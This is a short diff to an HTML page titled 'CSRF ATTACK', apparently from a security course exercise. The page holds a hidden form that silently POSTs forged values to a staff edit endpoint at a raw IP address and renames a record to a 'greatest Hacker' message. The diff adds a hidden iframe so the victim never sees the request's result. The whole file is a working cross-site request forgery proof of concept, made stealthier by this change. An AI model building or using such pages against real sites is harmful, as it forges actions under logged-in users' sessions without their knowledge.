@@ -4,7 +4,8 @@
     <title> CSRF ATTACK </title>
   </head>
   <body>
-       <form action='https://35.184.88.145/green/public/staff/states/edit.php?id=1' method='POST'>
+    <iframe name='output' style="visibility: hidden;"></iframe>
+       <form action='https://35.184.88.145/green/public/staff/states/edit.php?id=1' method='POST' target='output'>
           <input type='hidden' name='name' value='I will be the greatest Hacker! (CSRF ATTACK)'/>
           <input type='hidden' name='code' value='AL'/>
           <input type='hidden' name='country_id' value='1'/>
